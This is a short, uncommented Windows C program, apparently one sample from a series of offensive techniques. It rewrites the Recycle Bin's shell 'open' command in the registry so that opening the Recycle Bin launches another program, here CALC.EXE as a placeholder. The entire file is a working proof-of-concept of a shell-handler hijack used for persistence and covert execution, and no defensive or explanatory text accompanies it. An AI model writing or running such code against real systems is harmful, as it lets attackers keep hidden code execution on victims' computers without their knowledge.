#include <Windows.h>
#include <stdio.h>

#define WCHAR_MAXPATH (MAX_PATH * sizeof(WCHAR))

DWORD P0x4(VOID);

int main(VOID)
{
    DWORD dwReturn = ERROR_SUCCESS;
    dwReturn = P0x4();

    if (dwReturn != ERROR_SUCCESS)
    {
        return dwReturn;
    }

    return ERROR_SUCCESS;
}

DWORD P0x4(VOID)
{
    HKEY  hKey = HKEY_CLASSES_ROOT;
    WCHAR lpSubKey[WCHAR_MAXPATH] = L"CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command";
    WCHAR lpData[WCHAR_MAXPATH] = L"CALC.EXE";
    HKEY  phkResult = NULL;
    HKEY  hkResult;
    DWORD dispositions;

    if (RegCreateKeyEx(hKey, lpSubKey, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dispositions) != ERROR_SUCCESS)
    {
        goto EXIT_ROUTINE;
    }

    if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_ALL_ACCESS, &phkResult) != ERROR_SUCCESS)
    {
        goto EXIT_ROUTINE;
    }

    if (RegSetValueEx(phkResult, NULL, 0, REG_SZ, (PBYTE)lpData, sizeof(lpData)) != ERROR_SUCCESS)
    {
        goto EXIT_ROUTINE;
    }

    if (phkResult)
    {
        RegCloseKey(phkResult);
    }

    if (hkResult)
    {
        RegCloseKey(hkResult);
    }
        
    return ERROR_SUCCESS;

EXIT_ROUTINE:

    DWORD dwError = GetLastError();

    if (phkResult)
    {
        RegCloseKey(phkResult);
    }

    if (hkResult)
    {
        RegCloseKey(hkResult);
    }

    return dwError;
}